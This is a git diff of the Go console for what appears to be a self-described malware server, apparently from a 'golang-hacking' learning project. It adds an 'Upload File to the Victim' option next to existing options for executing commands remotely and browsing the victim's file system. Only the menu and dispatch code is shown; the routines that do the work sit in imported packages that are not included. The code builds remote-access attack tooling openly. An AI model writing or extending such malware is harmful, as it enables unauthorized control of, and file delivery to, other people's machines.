@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"golang-hacking/P3_malwareServer/core/ExecuteCommandWindows"
 	"golang-hacking/P3_malwareServer/core/Move"
+	"golang-hacking/P3_malwareServer/core/Upload"
 	"golang-hacking/P3_malwareServer/core/handleConnection"
 	"log"
 	"os"
@@ -26,6 +27,7 @@ func DisplayError(err error) {
 func options() {
 	fmt.Println("\t[1] Execute Command")
 	fmt.Println("\t[2] Move in File system")
+	fmt.Println("\t[3] UploadFile")
 	fmt.Println("\t[99] Exit")
 	fmt.Println()
 }
@@ -62,13 +64,21 @@ func main() {
 			fmt.Println("[+] Command Execution program")
 			err := ExecuteCommandWindows.ExecuteCommandRemotelyWindows(connection)
 			DisplayError(err)
+
 		case user_input == "2":
 			fmt.Println("[+] Navigating File system on Victim")
 			err = Move.NavigateFilesystem(connection)
 			DisplayError(err)
+
+		case user_input == "3":
+			fmt.Println("[+] Uploading File to the Victim")
+			err = Upload.UploadFile2Victim(connection)
+			DisplayError(err)
+
 		case user_input == "99":
 			fmt.Println("[+] Exiting the program")
 			loopControl = false
+
 		default:
 			fmt.Println("[-] Invalid option, try again ")
 		}
